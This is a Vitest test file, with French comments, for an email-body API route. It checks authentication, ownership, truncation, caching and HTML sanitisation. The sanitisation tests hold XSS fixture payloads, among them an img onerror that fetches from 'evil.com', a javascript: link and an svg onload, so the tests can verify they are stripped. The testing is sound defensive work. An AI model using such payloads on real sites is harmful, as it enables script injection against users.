/**
 * Tests pour `GET /api/email/[id]/body` — Phase 4 RED (regex-power)
 *
 * Couvre :
 *   - US-4 (preview live missing-action)
 *   - AC-9 (ownership : 404 cross-user, anti-enumeration)
 *   - AC-10 (truncation à 50 KB)
 *   - AC-11 (DOMPurify strip <script>)
 *   - AC-12 (cache 5min)
 *
 * NB : Le fichier `app/api/email/[id]/body/route.ts` n'existe pas encore — RED phase.
 *      Idem pour `lib/email-body-cache.ts`.
 */

import { beforeEach, describe, expect, it, vi } from "vitest";
import { NextRequest } from "next/server";

// ──────────────────────────────────────────────────────────────────────────────
// Mock du factory provider — counter pour vérifier le cache
// ──────────────────────────────────────────────────────────────────────────────
const providerCallCounter = { count: 0 };
const providerBodyResult: { value: string | null } = {
  value: "Bonjour, voir FAC-2024-0042 avant vendredi ?",
};
const providerThrows: { error: Error | null } = { error: null };

vi.mock("@/lib/email-provider/factory", () => ({
  createAllEmailProviders: vi.fn(async () => {
    return [
      {
        providerType: "IMAP",
        mailboxId: "mb-1",
        mailboxLabel: "Test",
        async getEmailBodyForAnalysis(_messageId: string | bigint) {
          providerCallCounter.count++;
          if (providerThrows.error) throw providerThrows.error;
          return providerBodyResult.value;
        },
      },
    ];
  }),
}));

import { GET } from "@/app/api/email/[id]/body/route";
import { auth } from "@/auth";
import { prisma } from "@/lib/db";

function req(id: string): NextRequest {
  return new NextRequest(`http://localhost/api/email/${id}/body`, {
    method: "GET",
  });
}

const mockSession = {
  user: { id: "user123", email: "user@example.com" },
  expires: "2099-01-01",
};

const mockEmailMetadata = {
  id: "email-1",
  userId: "user123",
  emailProvider: "IMAP",
  mailboxId: "mb-1",
  imapUID: BigInt(42),
  gmailMessageId: null,
  from: "boss@company.com",
  subject: "Facture",
  snippet: "voir FAC-2024-0042",
  receivedAt: new Date("2026-04-25T10:00:00Z"),
  labels: [],
  status: "ANALYZED",
  createdAt: new Date(),
  updatedAt: new Date(),
};

beforeEach(() => {
  vi.clearAllMocks();
  providerCallCounter.count = 0;
  providerBodyResult.value = "Bonjour, voir FAC-2024-0042 avant vendredi ?";
  providerThrows.error = null;
});

// ──────────────────────────────────────────────────────────────────────────────
// Auth & ownership
// ──────────────────────────────────────────────────────────────────────────────

describe("GET /api/email/[id]/body — auth & ownership", () => {
  it("should_return_401_when_no_session", async () => {
    // Arrange
    vi.mocked(auth).mockResolvedValue(null as any);

    // Act
    const res = await GET(req("email-1"), {
      params: Promise.resolve({ id: "email-1" }),
    });

    // Assert
    expect(res.status).toBe(401);
  });

  it("should_return_404_when_email_id_unknown", async () => {
    // Arrange
    vi.mocked(auth).mockResolvedValue(mockSession as any);
    vi.mocked(prisma.emailMetadata.findUnique).mockResolvedValue(null);

    // Act
    const res = await GET(req("ghost"), {
      params: Promise.resolve({ id: "ghost" }),
    });

    // Assert
    expect(res.status).toBe(404);
  });

  it("should_return_404_when_email_belongs_to_another_user", async () => {
    // Arrange (AC-9) — email existe MAIS appartient à un autre user.
    // L'API doit répondre 404 (pas 403) pour empêcher l'enumeration.
    vi.mocked(auth).mockResolvedValue(mockSession as any);
    vi.mocked(prisma.emailMetadata.findUnique).mockResolvedValue(null);

    // Act
    const res = await GET(req("email-1"), {
      params: Promise.resolve({ id: "email-1" }),
    });

    // Assert
    expect(res.status).toBe(404);
  });
});

// ──────────────────────────────────────────────────────────────────────────────
// Body retrieval
// ──────────────────────────────────────────────────────────────────────────────

describe("GET /api/email/[id]/body — body retrieval", () => {
  it("should_return_200_with_body_when_owner_requests", async () => {
    // Arrange
    vi.mocked(auth).mockResolvedValue(mockSession as any);
    vi.mocked(prisma.emailMetadata.findUnique).mockResolvedValue(
      mockEmailMetadata as any
    );

    // Act
    const res = await GET(req("email-1"), {
      params: Promise.resolve({ id: "email-1" }),
    });
    const data = await res.json();

    // Assert
    expect(res.status).toBe(200);
    expect(data.body).toContain("FAC-2024-0042");
    expect(data.truncated).toBe(false);
  });

  it("should_return_truncated_true_when_body_exceeds_50KB", async () => {
    // Arrange (AC-10) — body 80 KB → tronqué à 50 KB
    vi.mocked(auth).mockResolvedValue(mockSession as any);
    vi.mocked(prisma.emailMetadata.findUnique).mockResolvedValue(
      mockEmailMetadata as any
    );
    providerBodyResult.value = "x".repeat(80_000);

    // Act
    const res = await GET(req("email-1"), {
      params: Promise.resolve({ id: "email-1" }),
    });
    const data = await res.json();

    // Assert
    expect(res.status).toBe(200);
    expect(data.truncated).toBe(true);
    expect(data.body.length).toBeLessThanOrEqual(50_000);
  });

  it("should_return_503_when_provider_token_expired", async () => {
    // Arrange (US-4.4)
    vi.mocked(auth).mockResolvedValue(mockSession as any);
    vi.mocked(prisma.emailMetadata.findUnique).mockResolvedValue(
      mockEmailMetadata as any
    );
    providerThrows.error = Object.assign(new Error("token_expired"), {
      code: "TOKEN_EXPIRED",
    });

    // Act
    const res = await GET(req("email-1"), {
      params: Promise.resolve({ id: "email-1" }),
    });

    // Assert
    expect(res.status).toBe(503);
  });
});

// ──────────────────────────────────────────────────────────────────────────────
// Sanitization
// ──────────────────────────────────────────────────────────────────────────────

describe("GET /api/email/[id]/body — HTML sanitization", () => {
  it("should_sanitize_html_when_mimeType_is_text_html_strip_script", async () => {
    // Arrange (AC-11 + US-4.5)
    vi.mocked(auth).mockResolvedValue(mockSession as any);
    vi.mocked(prisma.emailMetadata.findUnique).mockResolvedValue(
      mockEmailMetadata as any
    );
    providerBodyResult.value =
      "<p>Hello FAC-2024-0042</p><script>alert('xss')</script>";

    // Act
    const res = await GET(req("email-1"), {
      params: Promise.resolve({ id: "email-1" }),
    });
    const data = await res.json();

    // Assert
    expect(res.status).toBe(200);
    expect(data.body).toContain("<p>");
    expect(data.body).toContain("Hello FAC-2024-0042");
    expect(data.body).not.toContain("<script");
    expect(data.body).not.toContain("alert");
  });

  it("should_strip_xss_attributes_via_dompurify", async () => {
    // Arrange (US-4.6) — onload, onerror, javascript: URLs strippés
    vi.mocked(auth).mockResolvedValue(mockSession as any);
    vi.mocked(prisma.emailMetadata.findUnique).mockResolvedValue(
      mockEmailMetadata as any
    );
    providerBodyResult.value =
      '<img src="x" onerror="fetch(\'//evil.com\')"><a href="javascript:alert(1)">click</a><svg onload="alert(2)"></svg>';

    // Act
    const res = await GET(req("email-1"), {
      params: Promise.resolve({ id: "email-1" }),
    });
    const data = await res.json();

    // Assert
    expect(res.status).toBe(200);
    expect(data.body).not.toContain("onerror");
    expect(data.body).not.toContain("onload");
    expect(data.body).not.toContain("javascript:");
  });
});

// ──────────────────────────────────────────────────────────────────────────────
// Cache & headers
// ──────────────────────────────────────────────────────────────────────────────

describe("GET /api/email/[id]/body — cache & headers", () => {
  it("should_use_cache_on_second_call_within_5min", async () => {
    // Arrange (AC-12) — 2 appels successifs dans la fenêtre 5min → 1 seul fetch provider
    vi.mocked(auth).mockResolvedValue(mockSession as any);
    vi.mocked(prisma.emailMetadata.findUnique).mockResolvedValue(
      mockEmailMetadata as any
    );

    // Act
    await GET(req("email-1"), {
      params: Promise.resolve({ id: "email-1" }),
    });
    await GET(req("email-1"), {
      params: Promise.resolve({ id: "email-1" }),
    });

    // Assert — provider appelé une seule fois (le 2ème vient du cache)
    expect(providerCallCounter.count).toBe(1);
  });

  it("should_set_cache_control_private_max_age_300", async () => {
    // Arrange
    vi.mocked(auth).mockResolvedValue(mockSession as any);
    vi.mocked(prisma.emailMetadata.findUnique).mockResolvedValue(
      mockEmailMetadata as any
    );

    // Act
    const res = await GET(req("email-1"), {
      params: Promise.resolve({ id: "email-1" }),
    });

    // Assert
    const cacheControl = res.headers.get("cache-control") ?? "";
    expect(cacheControl).toMatch(/private/);
    expect(cacheControl).toMatch(/max-age=300/);
  });
});
